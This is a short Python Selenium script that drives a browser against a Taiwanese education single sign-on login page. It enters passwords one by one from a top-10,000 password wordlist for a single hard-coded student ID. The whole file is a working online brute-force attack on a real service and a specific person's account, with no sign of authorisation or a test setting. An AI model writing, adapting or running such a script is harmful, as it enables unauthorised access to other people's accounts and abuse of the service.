from time import sleep as sl
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

URL = "https://kh.sso.edu.tw/auth-server-stlogin?Auth_Request_RedirectUri=https%253A%252F%252Foidc.tanet.edu.tw%252Fcncreturnpage&Auth_Request_State=a1h8GqiVsrDoNh4wHfqx3IIcWZbx0JrRRDGpc8cGzRk&Auth_Request_Response_Type=code&Auth_Request_Client_ID=cf789350df91c914eede027ce55f3ab5&Auth_Request_Nonce=bKyFuJbbQXulFBTlu3yv5o16-UOKzp4QaK7gfId4Op0&Auth_Request_Scope=openid+exchangedata&local=true"

driver = webdriver.Chrome()
driver.get(URL)

def get_txt_passwd(line):
    with open("passwd-CN-Top10000.txt", "r") as file :
        for _ in range(line - 1):
            next(file)
        return next(file).strip()

def login():
    sl(.05)
    for line in range(1,9999):
        username = driver.find_element(By.NAME, "username")
        passwd = driver.find_element(By.NAME, "password")
        iogin = driver.find_element(By.ID, "idf")
        username.clear()
        username.send_keys("S0906335")
        passwd.send_keys(get_txt_passwd(line))
        iogin.click()
        sl(.07)
        print(f"{get_txt_passwd(line)}正在嘗試登入")
        if line % 10 == 0:
            print(f"已嘗試{line}次")



login()
driver.quit()